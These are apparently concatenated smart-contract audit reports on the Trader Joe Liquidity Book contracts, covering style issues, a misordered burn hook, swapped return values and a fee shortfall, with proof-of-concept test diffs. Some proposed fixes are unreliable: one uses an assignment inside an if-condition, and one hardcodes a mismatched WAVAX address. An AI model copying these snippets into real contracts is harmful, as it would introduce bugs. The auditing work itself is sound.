### Non-Critical Issues List | Number |Issues Details|Context| |:--:|:-------|:--:| | [N-01 ]| Insufficient coverage file | | | [N-02] |Argument assignment architecture of setFactoryLockedState function may cause error|1| | [N-03] | `0` address check | 6 | | [N-04] | Use `require` instead of `assert` | 1 | | [N-05] | For modern and more readable code; update import usages | All contracts | | [N-06] | `Empty blocks` should be _removed_ or _Emit_ something | 1 | | [N-07] | `Function writing` that does not comply with the `Solidity Style Guide`| 5 | | [N-08] | Compliance with Solidity Style rules in Constant expressions | 2 | | [N-09] | Omissions in Events |  | | [N-10] | Need Fuzzing test |  | | [N-11] |Use a more recent version of Solidity | All contracts | | [N-12] | Solidity compiler optimizations can be problematic | 1 |  Total 12 issues   ### Low Risk Issues List | Number |Issues Details|Context |:--:|:-------|:--:| |[L-01]| Use ```safeTransferOwnership``` instead of ```transferOwnership``` function | 1 | |[L-02]| Owner can renounce Ownership| 1 | |[L-03]| Use a more recent version of OpenZeppelin dependencies | All contracts | |[L-04]| WAWAX address definition can be use directly | 1 | |[L-05]| 2 step changes for privileged contract addresses | 1 |  Total 5 issues  ### Suggestions | Number | Suggestion Details | |:--:|:-------| | [S-01] |Add to _blacklist function_ | | [S-02] | Generate perfect code headers every time |  Total 2 suggestions    ### [N-01] Insufficient coverage  **Description:** The test coverage rate of the project is 63%. Testing all functions is best practice in terms of security criteria. ```js +-------------+-------------------+--------------------+-------------------+------------------+ | File        | % Lines           | % Statements       | % Branches        | % Funcs          | +=============================================================================================+ | Total       | 62.23% (850/1366) | 63.67% (1069/1679) | 49.09% (296/603)  | 55.42% (138/249) | +-------------+-------------------+--------------------+-------------------+------------------+  ``` Due to its capacity, test coverage is expected to be 100%  ### [N-02] Argument assignment architecture of setFactoryLockedState function may cause error  **Context:** [LBFactory.sol#L485](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBFactory.sol#L485)  **Description:** The setFactoryLockedState function replaces the "creationUnlocked bool" value. But it reverses the result with value input  For example ; When you set the _locked argument to true , creationUnlocked gets false When you set the _locked argument to false , creationUnlocked gets true  The opposite of the desired value and the required value may cause an error.  ```js  function setFactoryLockedState(bool _locked) external override onlyOwner {         if (creationUnlocked != _locked) revert LBFactory__FactoryLockIsAlreadyInTheSameState();         creationUnlocked = !_locked;         emit FactoryLockedStatusUpdated(_locked);     } ```  **Recommendation:** Change the architecture so that the input and output are the same  ```js  function setFactoryLockedState(bool _locked) external override onlyOwner {         if (creationUnlocked = _locked) revert LBFactory__FactoryLockIsAlreadyInTheSameState();         creationUnlocked = _locked;         emit FactoryLockedStatusUpdated(_locked);     } ```  ### [N-03] `0 address` check  **Context:** [LBQuoter.sol#L45](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBQuoter.sol#L45) [LBQuoter.sol#L46](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBQuoter.sol#L46) [LBQuoter.sol#L47](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBQuoter.sol#L47) [LBRouter.sol#L57](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L57) [LBRouter.sol#L58](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L58) [LBRouter.sol#L59](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L59)  **Description:** Also check of the address to protect the code from 0x0 address  problem just in case. This is best practice or instead of suggesting that they verify address != 0x0, you could add some good NatSpec comments explaining what is valid and what is invalid and what are the implications of accidentally using an invalid address.  **Recommendation:** like this; `if (routerV2== address(0)) revert ADDRESS_ZERO();`   ### [N-04] Use `require` instead of `assert`  **Context:** [LBFactory.sol#L141](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBFactory.sol#L141)  **Description:** Assert should not be used except for tests, `require` should be used  Prior to Solidity 0.8.0, pressing a confirm consumes the remainder of the process's available gas instead of returning it, as request()/revert() did.  assert() and ruqire(); The big difference between the two is that the `assert()`function when false, uses up all the remaining gas and reverts all the changes made. Meanwhile, a  `require()` function when false, also reverts back all the changes made to the contract but does refund all the remaining gas fees we offered to pay.This is the most common Solidity function used by developers for debugging and error handling.  Assertion() should be avoided even after solidity version 0.8.0, because its documentation states "The Assert function generates an error of type Panic(uint256). Code that works properly should never Panic, even on invalid external input. If this happens, you need to fix it in your contract. there's a mistake".  ### [N-05] For modern and more readable code; update import usages  **Context:** All contracts  **Description:** Solidity code is also cleaner in another waythat might not be noticeable: thestruct Point. We were importing it previously with global import but not using it. ThePointstruct `polluted the source code` with an unnecessary object we were not using because we did not need it.  This was breaking the rule of modularity and modular programming: `only import what you need` Specific imports with curly braces allow us to apply this rule better.  **Recommendation:** `import {contract1 , contract2} from "filename.sol";`  A good example from the ArtGobblers project; ```js import {Owned} from "solmate/auth/Owned.sol"; import {ERC721} from "solmate/tokens/ERC721.sol"; import {LibString} from "solmate/utils/LibString.sol"; import {MerkleProofLib} from "solmate/utils/MerkleProofLib.sol"; import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol"; import {ERC1155, ERC1155TokenReceiver} from "solmate/tokens/ERC1155.sol"; import {toWadUnsafe, toDaysWadUnsafe} from "solmate/utils/SignedWadMath.sol"; ```  ### [N-06] `Empty blocks` should be _removed_ or _Emit_ something  **Context:** [LBToken.sol#L326](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBToken.sol#L326)  **Description:** Code contains empty block  ```js  function _beforeTokenTransfer(         address from,         address to,         uint256 id,         uint256 amount     ) internal virtual {} } ```  **Recommendation:** The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting.  If the code is not upgradeable and this function is not used, remove it directly  ### [N-07] `Function writing` that does not comply with the `Solidity Style Guide`  **Context:** [LBRouter.sol](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol) [LBFactory.sol](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBFactory.sol) [LBPair.sol](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBPair.sol) [LBRouter.sol](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol) [LBToken.sol](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBToken.sol)  **Description:** Order of Functions; ordering helps readers identify which functions they can call and to find the constructor and fallback definitions easier. But there are contracts in the project that do not comply with this.  https://docs.soliditylang.org/en/v0.8.17/style-guide.html  Functions should be grouped according to their visibility and ordered:  - constructor - receive function (if exists) - fallback function (if exists) - external - public - internal - private - within a grouping, place theviewandpurefunctions last  ### [N-08] Compliance with Solidity Style rules in Constant expressions  **Context:** [LBToken.sol#L29](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBToken.sol#L29) [LBToken.sol#L30](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBToken.sol#L30)   **Recommendation:** Variables are declared asconstantutilize theUPPER_CASE_WITH_UNDERSCORESformat.  ### [N-09] Omissions in Events  Throughout the codebase, events are generally emitted when sensitive changes are made to the contracts. However, some events are missing important parameters  The events should include the new value and old value where possible:  Events with no old value; [PendingOwnable.sol#L103](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/libraries/PendingOwnable.sol#L103)  ### [N-10] Need Fuzzing test  **Context:** 35 results - 9 files Project uncheckeds list:  ```js  39 results - 9 files  src/LBFactory.sol:   162:         unchecked {   190:         unchecked { src/LBPair.sol:   224:         unchecked {   273:         unchecked {   398:         unchecked {   495:         unchecked {   622:         unchecked {   694:         unchecked {   736:         unchecked {   793:         unchecked {   814:         unchecked {   887:         unchecked {   928:         unchecked { src/LBRouter.sol:   661:         unchecked {   777:         unchecked {   830:         unchecked {   877:         unchecked {   950:         unchecked { src/LBToken.sol:    89:          unchecked {   162:         unchecked {   189:         unchecked {   214:         unchecked {   239:         unchecked { src/libraries/BinHelper.sol:   23:           unchecked {   41:           unchecked {   54:           unchecked { src/libraries/BitMath.sol:    40:          unchecked {    57:          unchecked {    70:          unchecked {   109:         unchecked { src/libraries/FeeDistributionHelper.sol:   41:           unchecked {   54:           unchecked { src/libraries/Math128x128.sol:   46:          unchecked { src/libraries/Math512Bits.sol:    70:         unchecked {   129:        unchecked { ```  **Description:** In total 9 contracts, 39 unchecked are used, the functions used are critical. For this reason, there must be fuzzing tests in the tests of the project. Not seen in tests.  **Recommendation:** Use should fuzzing test like Echidna.  As Alberto Cuesta Canada said: _Fuzzing is not easy, the tools are rough, and the math is hard, but it is worth it. Fuzzing gives me a level of confidence in my smart contracts that I didnt have before. Relying just on unit testing anymore and poking around in a testnet seems reckless now._  https://medium.com/coinmonks/smart-contract-fuzzing-d9b88e0b0a05  ### [N-11] Use a more recent version of Solidity  **Context:** All contracts  **Description:** For security, it is best practice to use the latest Solidity version. For the security fix list in the versions; https://github.com/ethereum/solidity/blob/develop/Changelog.md   **Recommendation:** Old version of Solidity is used `(0.8.0)`, newer version can be used `(0.8.17)`  ### [N-12] Solidity compiler optimizations can be problematic  **Context:** [foundry.toml#L6](https://github.com/code-423n4/2022-10-traderjoe/blob/main/foundry.toml#L6)  ```js main/ foundry.toml#L6:  [profile.default] src = 'src' out = 'out' libs = ['lib'] optimizer = true optimizer_runs = 800 ```  **Description:** Protocol has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them.   Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by Truffle and Remix persisted until late 2018. The fix for this bug was not reported in the Solidity CHANGELOG.   Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations.  Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-jscauses a security vulnerability in the contracts.  **Recommendation:** Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.    ### [L-01] Use ```safeTransferOwnership``` instead of ```transferOwnership``` function  **Context:** [PendingOwnable.sol#L91-L95](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/libraries/PendingOwnable.sol#L91-L95)  **Description:** ```transferOwnership``` function is used to change Ownership  Use a 2 structure transferOwnership which is safer.  ```safeTransferOwnership```,  use it is more secure due to 2-stage ownership transfer.  **Recommendation:** Use ``Ownable2Step.sol`` [Ownable2Step.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol)  ```js  /**      * @dev The new owner accepts the ownership transfer.      */     function acceptOwnership() external {         address sender = _msgSender();         require(pendingOwner() == sender, "Ownable2Step: caller is not the new owner");         _transferOwnership(sender);     } } ``` ### [L-02] Owner can renounce Ownership  **Context:** [PendingOwnable.sol#L84](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/libraries/PendingOwnable.sol#L84)  **Description:** Typically, the contracts owner is the account that deploys the contract. As a result, the owner is able to perform certain privileged activities.  The Trader JoesOwnableused inthis projectcontract implementsrenounceOwnership. This can represent a certain risk if the ownership is renounced for any other reason than by design. Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner.   `onlyOwner` functions; ```js 14 results - 2 files  src/LBFactory.sol:   220:     function setLBPairImplementation(address _LBPairImplementation) external override onlyOwner {   322:     ) external override onlyOwner {   355:     ) external override onlyOwner {   401:     function removePreset(uint16 _binStep) external override onlyOwner {   439:     ) external override onlyOwner {   473:     function setFeeRecipient(address _feeRecipient) external override onlyOwner {   479:     function setFlashLoanFee(uint256 _flashLoanFee) external override onlyOwner {   490:     function setFactoryLockedState(bool _locked) external override onlyOwner {   498:     function addQuoteAsset(IERC20 _quoteAsset) external override onlyOwner {   507:     function removeQuoteAsset(IERC20 _quoteAsset) external override onlyOwner {   525:     function forceDecay(ILBPair _LBPair) external override onlyOwner {  src/libraries/PendingOwnable.sol:   59:     function setPendingOwner(address pendingOwner_) public override onlyOwner {   68:     function revokePendingOwner() public override onlyOwner {   84:     function renounceOwnership() public override onlyOwner {  ```  **Recommendation:** We recommend to either reimplement the function to disable it or to clearly specify if it is part of the contract design.  ### [L-03] Use a more recent version of OpenZeppelin dependencies  **Context:** All contracts  **Description:** For security, it is best practice to use the latest OZ version.  [package.json#L4](https://github.com/code-423n4/2022-10-traderjoe/blob/main/lib/openzeppelin-contracts/package.json#L4)  ```js "name": "openzeppelin-solidity",   "description": "Secure Smart Contract library for Solidity",   "version": "4.6.0", ```  For the security fix list in the versions; https://github.com/ethereum/solidity/blob/develop/Changelog.md   **Recommendation:** Old version of OZ is used `(4.6.0)`, newer version can be used `(4.7.3)`   https://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.7.3   ### [L-04] WAWAX address definition can be use directly  **Context:** [LBRouter.sol#L59](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L59)  **Description:** Wawax is a wrap avax contract with a specific address in the Avalanche network, giving the option to define it may cause false recognition, it is healthier to define it directly.  Advantages of defining a specific contract directly: - It saves gas  - Prevents incorrect argument definition  - Prevents execution on a different chain and re-signature issues  WAWAX Address : 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7  ```js constructor(         ILBFactory _factory,         IJoeFactory _oldFactory,         IWAVAX _wavax     ) {         factory = _factory;         oldFactory = _oldFactory;         wavax = _wavax;     } ```  **Recommendation:** ```js address private constant wavax = 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2;  constructor(         ILBFactory _factory,         IJoeFactory _oldFactory,      ) {         factory = _factory;         oldFactory = _oldFactory;     } ```   ### [L-05] 2 step changes for privileged contract addresses  **Context:** https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBFactory.sol#L468   **Description:** Some contracts in the project have setters for privileged addresses that control the contract logic, such as the keeper.It would be best to do a two step change for those addresses.  First, nominate the address, and second accept the nomination from that address ensuring that the access is indeed secured  ``` src/LBFactory.sol:   530:     function setFeeRecipient(address _feeRecipient) external override onlyOwner {   531          _setFeeRecipient(_feeRecipient); ```  **Recommendation:**  ```js ///  _feeRecipient will only be changed if the new _feeRecipient accepts it. It will be pending till then. function setFeeRecipient(address _feeRecipient) external override onlyOwner {     pendingFeeRecipient = _feeRecipient; }  function acceptFeeRecipient() public {     require(msg.sender == pendingFeeRecipient, "INVALID_ADDRESS");     _setFeeRecipient(pendingFeeRecipient); } ```   ### [S-01] Add to _blacklist function_  **Description:** Cryptocurrency mixing service, Tornado Cash, has been blacklisted in the OFAC. A lot of blockchain companies, token projects, NFT Projects have ```blacklisted``` all Ethereum addresses owned by Tornado Cash listed in the US Treasury Department's sanction against the protocol. https://home.treasury.gov/policy-issues/financial-sanctions/recent-actions/20220808  Some of these Projects;  - USDC   - Aave   - Uniswap  - Balancer  - Infura  - Alchemy   - Opensea  - dYdX   For this reason, every project in the Avalanche network must have a blacklist function, this is a good method to avoid legal problems in the future, apart from the current need.  Transactions from the project by an account funded by Tonadocash or banned by OFAC can lead to legal problems.Especially American citizens may want to get addresses to the blacklist legally, this is not an obligation  If you think that such legal prohibitions should be made directly by validators, this may not be possible: https://www.paradigm.xyz/2022/09/base-layer-neutrality  ```The ban on Tornado Cash makes little sense, because in the end, no one can prevent people from using other mixer smart contracts, or forking the existing ones. It neither hinders cybercrime, nor privacy.```  Here is the most beautiful and close to the project example; Manifold  Manifold Contract https://etherscan.io/address/0xe4e4003afe3765aca8149a82fc064c0b125b9e5a#code  ```js      modifier nonBlacklistRequired(address extension) {          require(!_blacklistedExtensions.contains(extension), "Extension blacklisted");          _;      } ``` Recommended Mitigation Steps add to Blacklist function and modifier.   ### [S-02] Generate perfect code headers every time  **Description:** I recommend using header for Solidity code layout and readability  https://github.com/transmissions11/headers  ```js /*//////////////////////////////////////////////////////////////                            TESTING 123 //////////////////////////////////////////////////////////////*/ ```
# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/37258d595d596c195507234f795fa34e319b0a68/src/LBToken.sol#L237   # Vulnerability details  ## Impact In `LBToken._burn`, the `_beforeTokenTransfer` hook is called with `from = address(0)` and `to = _account`: ```solidity _beforeTokenTransfer(address(0), _account, _id, _amount); ``` Through a lucky coincidence, it turns out that this in the current setup does not cause a high severity issue. `_burn` is always called with `_account = address(this)`, which means that `LBPair._beforeTokenTransfer` is a NOP. However, this wrong call is very dangerous for future extensions or protocol that built on top of the protocol / fork it.  ## Proof Of Concept Let's say the protocol is extended with some logic that needs to track mints / burns. The canonical way to do this would be: ```solidity function _beforeTokenTransfer(         address _from,         address _to,         uint256 _id,         uint256 _amount     ) internal override(LBToken) {  if (_from == address(0)) {   // Mint Logic  } else if (_to == address(0)) {   // Burn Logic  } } ``` Such an extension would break, which could lead to loss of funds or a bricked system.  ## Recommended Mitigation Steps Call the hook correctly: ```solidity _beforeTokenTransfer(_account, address(0), _id, _amount); ```
# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/e81b78ddb7cc17f0ece921fbaef2c2521727094b/src/LBRouter.sol#L291   # Vulnerability details  ## Impact `LBRouter.removeLiquidity` reorders tokens when the user did not pass them in the pair order (ascending order): ```solidity if (_tokenX != _LBPair.tokenX()) {             (_tokenX, _tokenY) = (_tokenY, _tokenX);             (_amountXMin, _amountYMin) = (_amountYMin, _amountXMin); } ``` However, when returning `amountX` and `amountY`, it is ignored if the order was changed: ```solidity (amountX, amountY) = _removeLiquidity(_LBPair, _amountXMin, _amountYMin, _ids, _amounts, _to); ``` Therefore, when the order of the tokens is swapped by the function, the return value `amountX` ("Amount of token X returned") in reality is the amount of the user-provided token Y that is returned and vice versa.  Because this is an exposed function that third-party protocols / contracts will use, this can cause them to malfunction. For instance, when integrating with Trader Joe, something natural to do is: ``` (uint256 amountAReceived, uint256 amountBReceived) = LBRouter.removeLiquidity(address(tokenA), address(tokenB), ...); contractBalanceA += amountAReceived; contractBalanceB += amountBReceived; ``` This snippet will only be correct when the token addresses are passed in the right order, which should not be the case. When they are not passed in the right order, the accounting of third-party contracts will be messed up, leading to vulnerabilities / lost funds there.  ## Proof Of Concept First consider the following diff, which shows a scenario when `LBRouter` does not switch `tokenX` and `tokenY`, resulting in correct return values: ```diff --- a/test/LBRouter.Liquidity.t.sol +++ b/test/LBRouter.Liquidity.t.sol @@ -57,7 +57,9 @@ contract LiquidityBinRouterTest is TestHelper {            pair.setApprovalForAll(address(router), true);   -        router.removeLiquidity( +        uint256 token6BalBef = token6D.balanceOf(DEV); +        uint256 token18BalBef = token18D.balanceOf(DEV); +        (uint256 amountFirstRet, uint256 amountSecondRet) = router.removeLiquidity(              token6D,              token18D,              DEFAULT_BIN_STEP, @@ -70,7 +72,9 @@ contract LiquidityBinRouterTest is TestHelper {          );            assertEq(token6D.balanceOf(DEV), amountXIn); +        assertEq(amountXIn, token6BalBef + amountFirstRet);          assertEq(token18D.balanceOf(DEV), _amountYIn); +        assertEq(_amountYIn, token18BalBef + amountSecondRet);      }        function testRemoveLiquidityReverseOrder() public { ``` This test passes (as it should). Now, consider the following diff, where `LBRouter` switches `tokenX` and `tokenY`: ```diff --- a/test/LBRouter.Liquidity.t.sol +++ b/test/LBRouter.Liquidity.t.sol @@ -57,12 +57,14 @@ contract LiquidityBinRouterTest is TestHelper {            pair.setApprovalForAll(address(router), true);   -        router.removeLiquidity( -            token6D, +        uint256 token6BalBef = token6D.balanceOf(DEV); +        uint256 token18BalBef = token18D.balanceOf(DEV); +        (uint256 amountFirstRet, uint256 amountSecondRet) = router.removeLiquidity(              token18D, +            token6D,              DEFAULT_BIN_STEP, -            totalXbalance,              totalYBalance, +            totalXbalance,              ids,              amounts,              DEV, @@ -70,7 +72,9 @@ contract LiquidityBinRouterTest is TestHelper {          );            assertEq(token6D.balanceOf(DEV), amountXIn); +        assertEq(amountXIn, token6BalBef + amountSecondRet);          assertEq(token18D.balanceOf(DEV), _amountYIn); +        assertEq(_amountYIn, token18BalBef + amountFirstRet);      }        function testRemoveLiquidityReverseOrder() public { ``` This test should also pass (the order of the tokens was only switched), but it does not because the return values are mixed up.  ## Recommended Mitigation Steps Add the following statement in the end: ```solidity if (_tokenX != _LBPair.tokenX()) {  return (amountY, amountX); } ```
# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L59-L65 https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L329-L330 https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L124-L125   # Vulnerability details  # LBPair contracts consistently collect less fees than their FeeParameters --- ## Github and source code  https://github.com/sha256yan/incorrect-fee --- ## Motivation and Severity  LBpair contracts' fees fall short by 0.1% on single bin with the deficit growing exponentially with multi-bin swaps.   This report will refer to this difference in fees, that is, the difference between the expected fees and the actual collected fees as the "Fee Deficit".   ![feeDeficitGrowth](https://user-images.githubusercontent.com/91401566/197405701-e6df80c4-dcdf-44f5-9fd2-74ef1c66b954.png)  The exponential growth of the Fee Deficit percentage is concerning, considering that the vast majority of the fees collected by LPs and DEXs are during high volatility periods. Note that the peak Fee Deficit percentage of 1.6% means that 1.6% of expected fees would not be collected.     https://user-images.githubusercontent.com/91401566/197406096-5771893b-82f6-43e8-aa42-ccda449e4936.mov  With an assumed average total fee of 1% (higher than usual due to ```variableFee``` component) and average Fee Deficit percentage of 0.4%; The total Fee Deficit from a period similar to May 7th 2022 - May 14th 2022, with approximately \$1.979B in trading volume, would be $***79,160*** over one week.     [SwapHelper.getAmounts](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L59-L65) carries most of the blame for this error.   3 main causes have been identified and will be discussed in this report. - [Incorrect use of getFeeAmountFrom](#incorrect-use-of-getfeeamountfrom) - [Incorrect conditional for amountIn overflow](#incorrect-conditional-for-amountin-overflow) - [Need for an additional FeeHelper function](#need-for-an-additional-feehelper-function)   ---      ### Affected contracts and libraries  - LBPair.sol   - [swap](https://github.com/sha256yan/incorrect-fee/blob/dc355df9ee61a41185dedd7017063fc508584f24/src/LBPair.sol#L304-L330)  - LBRouter.sol   - [getSwapIn](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L124-L125)   - [getSwapOut](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L168-L169)  - SwapHelper.sol   - [getAmounts](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L59-L65)   ---  ### Proposed changes  - FeeHelper.sol   - [getAmountInWithFees](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/libraries/FeeHelper.sol#L164-L173) ( ***New*** )   - SwapHelper.sol   - [getAmountsV2](https://github.com/sha256yan/incorrect-fee/blob/348b00988d377d96c9ad64917413524815739884/src/libraries/SwapHelper.sol#L118-L126) ( ***New*** )  - LBRouter.sol   - [getSwapIn](https://github.com/sha256yan/incorrect-fee/blob/716cddf2583da86674376cb5346bf46b701b242c/test/mocks/correctFee/LBRouterV2.sol#L124-L125) ( ***Modified*** )   - [getSwapOut](https://github.com/sha256yan/incorrect-fee/blob/c1719b8429c7d25e4e12fc4632842285a2eaaf8b/test/mocks/correctFee/LBRouterV2.sol#L168-L169) ( ***Modified*** )  - LBPair.sol   - [swap](https://github.com/sha256yan/incorrect-fee/blob/348b00988d377d96c9ad64917413524815739884/test/mocks/correctFee/LBPair.sol#L332-L333)  ( ***Modified*** )  ---  ### Details - As mentioned earlier, most issues arise from SwapHelper.getAmounts . The SwapHelper library is often used for the Bin type. ([Example in LBPair](https://github.com/sha256yan/incorrect-fee/blob/dc355df9ee61a41185dedd7017063fc508584f24/src/LBPair.sol#L36)). The proposed solution includes the new functions [SwapHelper.getAmountsV2](https://github.com/sha256yan/incorrect-fee/blob/48b5caee818c1befb5733c3f96e415ca14a67bf2/src/libraries/SwapHelper.sol#L76-L133) and [FeeHelper.getAmountInWithFees](https://github.com/sha256yan/incorrect-fee/blob/48b5caee818c1befb5733c3f96e415ca14a67bf2/src/libraries/FeeHelper.sol#L164-L173). - LBPair.swap uses _bin.getAmounts(...) on the active bin to calculate fees. ([See here](https://github.com/sha256yan/incorrect-fee/blob/dc355df9ee61a41185dedd7017063fc508584f24/src/LBPair.sol#L329-L330)) - Inside of SwapHelper.getAmounts, for a given swap, if a bin has enough liqudity, the fee is calculated using ([FeeHelper.getFeeAmountFrom](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L65)). This results in smaller than expected fees.  - LBRouter.getSwapOut relies on SwapHelper.getAmounts to simulate swaps. Its simulations adjust to the correct fee upon using SwapHelper.getAmountsV2 ([LBRouter.getSwapOut](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L124-L125), [SwapHelper.getAmounts](), [SwapHelper.getAmountsV2]()) - LBRouter.getSwapIn has a fee calculation error which is independent of SwapHelper.getAmounts. ([See here](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L168-L169)) - As of right now the LBPair.swap using getAmountsV2 uses 3.8% ***more*** gas.  ![LBPair comparison](https://user-images.githubusercontent.com/91401566/197410772-e3f1cb99-7181-48f7-a56a-2430176a92ff.png)   ---   # Incorrect use of getFeeAmountFrom - When there is enough liquidity in a bin for a swap, we should use FeeHelper.getFeeAmount(amountIn) instead of FeeHelper.getFeeAmountFrom(amountIn).  ### Evidence - amountIn, the parameter passed to calculate fees, is the amount of tokens in the LBPair contract in excess of the reserves and fees of the pair for that token. [Inside LBPair.sol](https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/LBPair.sol#L312-L314) --- [Inside TokenHelper](https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/libraries/TokenHelper.sol#L59-L69)   Will now use example numbers: - Let amountIn = 1e10 (meaning the user has transferred/minted 1e10 tokens to the LBPair) - Let PRECISION = 1e18 - Let totalFee =  0.00125 x precision (fee of 0.0125%) - Let price = 1 (parity) - If the current bin has enough liqudity, feeAmount must be: (amountIn * totalFee ) / (PRECISION) = 12500000  - [FeeHelper.getFeeAmountFrom(amountIn)](https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/libraries/FeeHelper.sol#L124-L126) uses the formula: feeAmount = (amountIn * totalFee) / (PRECISION + totalFee) = 12484394 - [FeeHelper.getFeeAmount(amountIn)](https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/libraries/FeeHelper.sol#L116-L118) uses exactly the formula ourlined in the correct feeAmount calculation and is the correct method in this case. - Visit the tests section to run a test.    ---   # Incorrect condition for amountIn overflow - The [condition](https://github.com/sha256yan/incorrect-fee/blob/348b00988d377d96c9ad64917413524815739884/src/libraries/SwapHelper.sol#L61) for when an amountIn overflows the maximum amount available in a bin is flawed. - The Fee Deficit here could potentially trigger an unnecessary bin de-activation.  ### Evidence #### Snippet 1 (SwapHelper.getAmounts)  ```         fees = fp.getFeeAmountDistribution(fp.getFeeAmount(_maxAmountInToBin));          if (_maxAmountInToBin + fees.total <= amountIn) {             //do things         } ``` - Collecting the fees on ```_maxAmountInToBin``` before doing so on ```amountIn``` means we are not checking  to see whether ```amountIn``` after   Consider the following: #### Snippet 2 (SwapHelper.getAmountsV2) ```         fees = fp.getFeeAmountDistribution(fp.getFeeAmount(amountIn));          if (_maxAmountInToBin <  amountIn - fees.total) {             //do things         } ``` - Now, the fees are collected on ```amountIn```. - Assuming both conditions are true, the fees from Snippet2 will be necessarily larger than those in Snippet1 since in both cases ``` _maxAmountInToBin <  amountIn ```. - Snippet 1 produces false positives. Meaning, SwapHelper.getAmounts changes its active bin id more than needed. (See Tests section at the bottom for the relevant test)    ---     # Need for an additional FeeHelper function - There are currently functions to answer the following question: How many tokens must a user send, to end up with a given amountInToBin after fees, before the swap itself takes place?  ### Evidence - ```LBRouter.getSwapIn(, amountOut, )``` needs this question answered. At a given price, how many tokens must a user send, to receive ```amountOut```?   - We use the ```amountOut``` and price to work backwards to the ```amountInToBin```.   - Current approach calculates fees on ```amountInToBin```. ([See here](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L124-L125))   - This is incorrect as fees should be calculated on ```amountIn```. (As we discussed in [Incorrect use of getFeeAmountFrom](#incorrect-use-of-getfeeamountfrom))   - SwapHelper.getAmounts needs to know what hypothetical ```amountIn``` would end up as ```maxAmountInToBin``` after fees. This is needed to be able to avoid [Incorrect amountIn overflow](#incorrect-conditional-for-amountin-overflow)   ---   ## Install dependencies  To install dependencies, run the following to install dependencies:  ``` forge install ```  ___  ## Tests  To run tests, run the following command:  ``` forge test --match-contract Report -vv ``` --- ## testSingleBinSwapFeeDifference: - Simple test to show the Fee Defecit in it's most basic form. --- ## testFalsePositiveBinDeactivation - Test that shows false positive resulting from the [Incorrect condition](#incorrect-conditional-for-amountin-overflow) --- #### testCorrectFeeBinDeactivation - Test that shows with getAmountsV2 the false positive issue is 